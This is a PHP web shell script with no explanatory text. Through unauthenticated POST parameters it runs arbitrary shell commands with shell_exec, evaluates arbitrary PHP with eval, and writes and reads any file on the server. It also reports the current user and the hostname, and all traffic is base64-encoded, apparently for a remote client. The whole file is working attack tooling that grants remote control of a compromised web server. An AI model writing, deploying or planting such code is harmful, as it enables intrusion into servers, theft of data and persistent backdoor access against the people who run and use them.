<?php 

function pb64($data, $sep = True) {
    print(base64_encode($data));
    if ($sep)
        print(":");
}

if (isset($_POST['chdir']) && !chdir(base64_decode($_POST['chdir']))) {
    pb64("Error: Unable to change directory to " . base64_decode($_POST['chdir']), False);
    http_response_code(202);
    exit();
}

if (isset($_POST['b64_env']) && !empty($_POST['b64_env'])) {
    foreach(explode(':', $_POST['b64_env']) as $b64) {
        putenv(base64_decode($b64));
    }
}

if (isset($_POST['action']) && !empty($_POST['action'])) {

    switch ($_POST['action']) {

        case 'init':
            pb64(DIRECTORY_SEPARATOR);
            pb64('php');
            pb64(rtrim(`whoami`));
            pb64(gethostname());
            break;

        case 'cmd':
            $arr = explode('<@:SEP:@>', base64_decode($_POST['b64_cmd']));
            $cmd = implode(' ', array_slice($arr, 0, -1)) . ' ' . escapeshellarg(array_pop($arr));
            pb64(shell_exec($cmd . ' 2>&1'));
            break;

        case 'eval':
            $file_content = base64_decode($_POST['b64_upload']);
            eval($file_content);
            break;

        case 'upload':
            $file_content = base64_decode($_POST['b64_upload']);
            $file_name = base64_decode($_POST['b64_filename']);

            if (is_dir($file_name))
                $file_name .= DIRECTORY_SEPARATOR . base64_decode($_POST['b64_orig']);

            if (!file_put_contents($file_name, $file_content)) {
                echo "Error: Unable to write data to $file_name";
                http_response_code(201);
                exit();
            }

            break;

        case 'download':
            $file_name = base64_decode($_POST['b64_filename']);
            $file_content = file_get_contents($file_name);
            pb64($file_content);
            break;
    }
}

pb64(getcwd(), False);
?>
